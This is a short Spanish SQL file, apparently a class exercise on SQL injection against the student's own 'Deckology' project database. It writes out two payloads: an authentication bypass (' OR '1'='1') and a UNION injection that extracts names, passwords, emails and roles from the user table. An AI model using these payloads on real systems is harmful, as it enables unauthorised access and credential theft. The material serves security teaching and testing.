
/*TAREA TAR-11.02: SEGURIDAD Y SQL INJECTION - PROYECTO DECKOLOGY*/

-- -----------------------------------------------------------------------------
-- 1. PRUEBAS DE EXPLOTACIÓN (SQL INJECTION)
-- -----------------------------------------------------------------------------

-- A. PUNTO 3: BYPASS DE LOGIN
-- Objetivo: Saltarse la autenticación sin contraseña.
-- Payload: ' OR '1'='1' -- -
SELECT * FROM usuario WHERE Email = '' OR '1'='1' -- -';

-- B. PUNTO 4: OBTENCIÓN DE DATOS (ATAQUE UNION)
-- Objetivo: Extraer todos los registros de la tabla mediante coincidencia de 7 columnas.
-- Payload: ' UNION SELECT 1, 'COD-99', Nombre, Contrasena, Email, tipoRol, puntuacion FROM usuario -- -
SELECT * FROM usuario WHERE Email = '' 
UNION SELECT 1, 'COD-99', Nombre, Contrasena, Email, tipoRol, puntuacion FROM usuario -- -';
